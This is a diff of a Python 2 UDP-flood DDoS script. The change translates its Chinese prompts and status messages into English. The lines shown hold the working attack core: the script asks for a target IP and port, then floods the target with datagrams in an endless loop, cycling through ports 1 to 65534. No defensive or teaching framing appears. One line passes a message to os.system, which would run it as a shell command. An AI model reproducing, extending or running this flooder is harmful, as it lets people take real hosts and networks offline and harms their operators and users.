@@ -28,11 +28,11 @@ print "|____/|_____/ \___/|___/     /_/   \_\__|\__\__,_|\___|_|\_\             
 
 
 print
-ip = raw_input("IP 地址 : ")
-port = input("攻击端口   : ")
+ip = raw_input("IP : ")
+port = input("port : ")
 
 os.system("clear")
-os.system("攻击即将启动")
+os.system("The DDos is starting")
 print "[                    ] 0% "
 time.sleep(5)
 print "[=====               ] 25%"
@@ -48,7 +48,7 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "发 %s 包到 %s 通过端口 :%s"%(sent,ip,port)
+     print "Send %s packet to %s throught port :%s"%(sent,ip,port)
      if port == 65534:
        port = 1
 
